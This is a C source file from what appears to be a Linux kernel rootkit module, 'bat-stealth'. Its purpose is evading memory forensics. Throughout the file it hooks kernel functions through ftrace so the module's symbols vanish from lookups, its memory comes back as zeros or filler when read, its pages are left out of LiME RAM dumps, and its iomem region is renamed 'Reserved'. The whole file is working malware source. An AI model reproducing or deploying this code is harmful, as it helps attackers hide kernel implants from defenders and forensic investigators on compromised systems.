/* selfdefense.c — Memory forensics evasion for bat-stealth.ko.
 *
 * Protections:
 *   1. copy_from_kernel_nofault hook — returns zeros for module pages (LiME bypass)
 *   2. kallsyms_on_each_symbol hook  — filters our symbols from kallsyms enumeration
 *   3. __module_address hook         — returns NULL for addresses within this module
 *   4. find_module hook              — returns NULL for "bat_stealth" name lookup
 *   5. LiME RAM walk hooks           — excludes module physical pages from dumps
 *   6. kmap hooks                    — returns zero page when our pages are mapped
 *   7. iomem poisoning               — renames our RAM region to "Reserved"
 *
 * Ported from Singularity selfdefense.c — no arch-specific changes needed
 * (all hooks are on internal kernel functions, not syscalls).
 */
#include "../include/core.h"
#include "../include/arch.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/selfdefense.h"

#define PROLOGUE_SNAP  16
#define MAX_SNAPS      512

struct sd_snap {
    unsigned long addr;
    u8            bytes[PROLOGUE_SNAP];
};

static struct sd_snap snaps[MAX_SNAPS];
static int            nsnaps = 0;
static DEFINE_SPINLOCK(sd_lock);
static atomic_t       sd_initialized  = ATOMIC_INIT(0);
static int            kprobe_hook_ok  = 0;

notrace void sd_protect_symbol(const char *symname)
{
    unsigned long addr;
    unsigned long flags;
    struct sd_snap *s;
    int i;

    addr = (unsigned long)resolve_sym(symname);
    if (!addr)
        return;

    spin_lock_irqsave(&sd_lock, flags);
    for (i = 0; i < nsnaps; i++) {
        if (snaps[i].addr == addr) {
            spin_unlock_irqrestore(&sd_lock, flags);
            return;
        }
    }
    if (nsnaps >= MAX_SNAPS) {
        spin_unlock_irqrestore(&sd_lock, flags);
        return;
    }
    s = &snaps[nsnaps++];
    s->addr = addr;
    memcpy(s->bytes, (const void *)addr, PROLOGUE_SNAP);
    spin_unlock_irqrestore(&sd_lock, flags);
}

static notrace const u8 *sd_find_snap(unsigned long addr, size_t size)
{
    int i;
    for (i = 0; i < nsnaps; i++) {
        if (addr >= snaps[i].addr &&
            (addr + size) <= (snaps[i].addr + PROLOGUE_SNAP))
            return snaps[i].bytes + (addr - snaps[i].addr);
    }
    return NULL;
}

/* ── kprobe protection ───────────────────────────────────────────── */

static int (*orig_register_kprobe)(struct kprobe *p);

static notrace int hook_register_kprobe(struct kprobe *p)
{
    int ret;
    const char *saved;

    if (!p)
        return orig_register_kprobe(p);

    if (within_module((unsigned long)__builtin_return_address(0), THIS_MODULE)) {
        saved          = p->symbol_name;
        p->symbol_name = NULL;
        ret = orig_register_kprobe(p);
        p->symbol_name = saved;
        return ret;
    }

    return orig_register_kprobe(p);
}

static struct ftrace_ops kprobe_hook_ops = {
    .func  = NULL,
    .flags = FTRACE_OPS_FL_SAVE_REGS |
             FTRACE_OPS_FL_RECURSION |
             FTRACE_OPS_FL_IPMODIFY,
};

static void notrace kprobe_ftrace_thunk(unsigned long ip,
                                        unsigned long parent_ip,
                                        struct ftrace_ops *ops,
                                        struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    if (!within_module(parent_ip, THIS_MODULE) && regs)
        REGS_SET_PC(regs, (unsigned long)hook_register_kprobe);
}

static notrace int sd_bootstrap_kprobe_hook(void)
{
    unsigned long addr = (unsigned long)&register_kprobe;
    int err;

    orig_register_kprobe = (int (*)(struct kprobe *))addr;
    kprobe_hook_ops.func = kprobe_ftrace_thunk;

    err = ftrace_set_filter_ip(&kprobe_hook_ops, addr, 0, 0);
    if (err)
        return err;

    err = register_ftrace_function(&kprobe_hook_ops);
    if (err) {
        ftrace_set_filter_ip(&kprobe_hook_ops, addr, 1, 0);
        return err;
    }

    return 0;
}

static void sd_bootstrap_kprobe_unhook(void)
{
    unsigned long addr = (unsigned long)&register_kprobe;
    if (!kprobe_hook_ok)
        return;
    kprobe_hook_ok = 0;
    unregister_ftrace_function(&kprobe_hook_ops);
    ftrace_set_filter_ip(&kprobe_hook_ops, addr, 1, 0);
}

/* ── copy_from_kernel_nofault hook — LiME read evasion ──────────── */

static long (*orig_copy_from_kernel_nofault)(void *dst, const void *src,
                                              size_t size);

static notrace long hook_copy_from_kernel_nofault(void *dst, const void *src,
                                                   size_t size)
{
    unsigned long addr = (unsigned long)src;
    const u8 *snap;

    if (within_module(addr, THIS_MODULE)) {
        snap = sd_find_snap(addr, size);
        if (snap && dst) { memcpy(dst, snap, size); return 0; }
        if (dst) memset(dst, 0x90, size);
        return 0;
    }

    snap = sd_find_snap(addr, size);
    if (snap && dst) {
        memcpy(dst, snap, size);
        return 0;
    }

    return orig_copy_from_kernel_nofault(dst, src, size);
}

/* ── kallsyms_on_each_symbol hook — symbol enumeration filter ────── */

typedef int (*ksym_cb_t)(void *data, const char *name, unsigned long addr);
static int (*orig_kallsyms_on_each_symbol)(ksym_cb_t fn, void *data);

struct sd_filter { ksym_cb_t fn; void *data; };

static notrace int sd_ksym_cb(void *data, const char *name, unsigned long addr)
{
    struct sd_filter *f = data;
    if (within_module(addr, THIS_MODULE))
        return 0;
    return f->fn(f->data, name, addr);
}

static notrace int hook_kallsyms_on_each_symbol(ksym_cb_t fn, void *data)
{
    struct sd_filter f = { .fn = fn, .data = data };
    return orig_kallsyms_on_each_symbol(sd_ksym_cb, &f);
}

/* ── __module_address + find_module hooks ────────────────────────── */

static struct module *(*orig_module_address)(unsigned long addr);

static notrace struct module *hook_module_address(unsigned long addr)
{
    if (addr == (unsigned long)fh_ftrace_thunk)
        return orig_module_address(addr);

    if (within_module(addr, THIS_MODULE))
        return NULL;

    return orig_module_address(addr);
}

static struct module *(*orig_find_module)(const char *name);

static notrace struct module *hook_find_module(const char *name)
{
    if (name && strcmp(name, KBUILD_MODNAME) == 0)
        return NULL;
    return orig_find_module(name);
}

/* ── Physical memory range ───────────────────────────────────────── */

static notrace void sd_module_phys_range(unsigned long *phys_start,
                                          unsigned long *phys_end)
{
    unsigned long va, size;
    struct page *pg;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    va   = (unsigned long)THIS_MODULE->mem[MOD_TEXT].base;
    size = THIS_MODULE->mem[MOD_TEXT].size;
#else
    va   = (unsigned long)THIS_MODULE->core_layout.base;
    size = THIS_MODULE->core_layout.size;
#endif

    if (!va || !size) {
        *phys_start = 0;
        *phys_end   = 0;
        return;
    }

    pg = vmalloc_to_page((void *)va);
    *phys_start = pg ? page_to_phys(pg) : 0;

    pg = vmalloc_to_page((void *)(va + size - 1));
    *phys_end = pg ? (page_to_phys(pg) + PAGE_SIZE - 1) : 0;
}

/* ── RAM walk hooks — LiME dump exclusion ───────────────────────── */

typedef int (*walk_ram_cb_t)(u64, u64, void *);
static int (*orig_walk_system_ram_res)(u64 start, u64 end, void *arg,
                                       walk_ram_cb_t func);

struct sd_walk_ctx { walk_ram_cb_t real_cb; void *real_arg; };

static notrace int sd_walk_filter(u64 start, u64 end, void *arg)
{
    struct sd_walk_ctx *ctx   = arg;
    unsigned long mod_start = 0, mod_end = 0;

    sd_module_phys_range(&mod_start, &mod_end);

    if (!mod_end || end < mod_start || start > mod_end)
        return ctx->real_cb(start, end, ctx->real_arg);

    if (start < mod_start)
        ctx->real_cb(start, (u64)mod_start - 1, ctx->real_arg);

    if (end > mod_end)
        ctx->real_cb((u64)mod_end + 1, end, ctx->real_arg);

    return 0;
}

static notrace int hook_walk_system_ram_res(u64 start, u64 end, void *arg,
                                             walk_ram_cb_t func)
{
    struct sd_walk_ctx ctx = { .real_cb = func, .real_arg = arg };
    return orig_walk_system_ram_res(start, end, &ctx, sd_walk_filter);
}

typedef int (*walk_iomem_cb_t)(struct resource *, void *);
static int (*orig_walk_iomem_res_desc)(unsigned long desc, unsigned long flags,
                                        u64 start, u64 end, void *arg,
                                        walk_iomem_cb_t func);

struct sd_iomem_ctx { walk_iomem_cb_t real_cb; void *real_arg; };

static notrace int sd_iomem_filter(struct resource *res, void *arg)
{
    struct sd_iomem_ctx *ctx = arg;
    unsigned long mod_start = 0, mod_end = 0;

    if (!res) return 0;

    sd_module_phys_range(&mod_start, &mod_end);

    if (!mod_end ||
        (u64)res->end < mod_start || (u64)res->start > mod_end)
        return ctx->real_cb(res, ctx->real_arg);

    return 0;
}

static notrace int hook_walk_iomem_res_desc(unsigned long desc,
                                             unsigned long flags,
                                             u64 start, u64 end,
                                             void *arg,
                                             walk_iomem_cb_t func)
{
    struct sd_iomem_ctx ctx = { .real_cb = func, .real_arg = arg };
    return orig_walk_iomem_res_desc(desc, flags, start, end,
                                    &ctx, sd_iomem_filter);
}

/* ── iomem poisoning ─────────────────────────────────────────────── */

extern struct resource iomem_resource;

static rwlock_t *sd_resource_lock                = NULL;
static const char *iomem_saved_name              = NULL;
static struct resource *iomem_poisoned           = NULL;

static notrace void sd_poison_iomem(void)
{
    unsigned long mod_phys = 0, mod_phys_end = 0;
    struct resource *r;

    if (!sd_resource_lock) return;

    sd_module_phys_range(&mod_phys, &mod_phys_end);
    if (!mod_phys) return;

    read_lock(sd_resource_lock);
    for (r = iomem_resource.child; r; r = r->sibling) {
        if (r->name &&
            strcmp(r->name, "System RAM") == 0 &&
            (unsigned long)r->start <= mod_phys &&
            (unsigned long)r->end   >= mod_phys) {
            iomem_saved_name = r->name;
            iomem_poisoned   = r;
            WRITE_ONCE(r->name, "Reserved");
            break;
        }
    }
    read_unlock(sd_resource_lock);
}

static notrace void sd_restore_iomem(void)
{
    if (iomem_poisoned && iomem_saved_name) {
        WRITE_ONCE(iomem_poisoned->name, iomem_saved_name);
        iomem_poisoned   = NULL;
        iomem_saved_name = NULL;
    }
}

/* ── kmap hooks — zero page substitution ─────────────────────────── */

static struct page *sd_zero_page = NULL;

static notrace int sd_page_is_ours(struct page *page)
{
    unsigned long mod_start = 0, mod_end = 0;
    unsigned long phys;

    if (!page) return 0;

    phys = page_to_phys(page);
    sd_module_phys_range(&mod_start, &mod_end);

    return (mod_end && phys >= mod_start && phys <= mod_end);
}

static void *(*orig_kmap_atomic)(struct page *page);

static notrace void *hook_kmap_atomic(struct page *page)
{
    if (sd_page_is_ours(page) && sd_zero_page)
        return orig_kmap_atomic(sd_zero_page);
    return orig_kmap_atomic(page);
}

static void *(*orig_kmap_local_page)(struct page *page);

static notrace void *hook_kmap_local_page(struct page *page)
{
    if (sd_page_is_ours(page) && sd_zero_page)
        return orig_kmap_local_page(sd_zero_page);
    return orig_kmap_local_page(page);
}

/* ── Hook tables ─────────────────────────────────────────────────── */

static struct ftrace_hook sd_hooks_core[] = {
    HOOK("copy_from_kernel_nofault", hook_copy_from_kernel_nofault,
                                     &orig_copy_from_kernel_nofault),
    HOOK("kallsyms_on_each_symbol",  hook_kallsyms_on_each_symbol,
                                     &orig_kallsyms_on_each_symbol),
    HOOK("__module_address",         hook_module_address,
                                     &orig_module_address),
    HOOK("find_module",              hook_find_module,
                                     &orig_find_module),
};

static struct ftrace_hook sd_hooks_lime[] = {
    HOOK("walk_system_ram_res",  hook_walk_system_ram_res,  &orig_walk_system_ram_res),
    HOOK("walk_iomem_res_desc",  hook_walk_iomem_res_desc,  &orig_walk_iomem_res_desc),
    HOOK("kmap_atomic",          hook_kmap_atomic,          &orig_kmap_atomic),
    HOOK("kmap_local_page",      hook_kmap_local_page,      &orig_kmap_local_page),
};

static unsigned int sd_lime_installed = 0;

/* ── Init / Exit ─────────────────────────────────────────────────── */

notrace int selfdefense_init(void)
{
    int err;

    sd_resource_lock = (rwlock_t *)resolve_sym("resource_lock");

    sd_zero_page = alloc_page(GFP_KERNEL | __GFP_ZERO);

    err = fh_install_hooks(sd_hooks_core, ARRAY_SIZE(sd_hooks_core));
    if (err) {
        if (sd_zero_page) { __free_page(sd_zero_page); sd_zero_page = NULL; }
        return err;
    }

    {
        int i;
        for (i = 0; i < (int)ARRAY_SIZE(sd_hooks_lime); i++) {
            if (fh_install_hook(&sd_hooks_lime[i]) == 0)
                sd_lime_installed |= (1u << i);
        }
    }

    if (sd_bootstrap_kprobe_hook() == 0)
        kprobe_hook_ok = 1;

    sd_poison_iomem();
    atomic_set(&sd_initialized, 1);
    return 0;
}

notrace void selfdefense_exit(void)
{
    /* Idempotent: Phase 1 (sysfs) and __exit both call this; only run once */
    if (!atomic_cmpxchg(&sd_initialized, 1, 0))
        return;

    sd_restore_iomem();
    fh_remove_hooks(sd_hooks_core, ARRAY_SIZE(sd_hooks_core));

    {
        int i;
        for (i = 0; i < (int)ARRAY_SIZE(sd_hooks_lime); i++) {
            if (sd_lime_installed & (1u << i))
                fh_remove_hook(&sd_hooks_lime[i]);
        }
        sd_lime_installed = 0;
    }

    sd_bootstrap_kprobe_unhook();

    if (sd_zero_page) {
        __free_page(sd_zero_page);
        sd_zero_page = NULL;
    }

    nsnaps = 0;
}
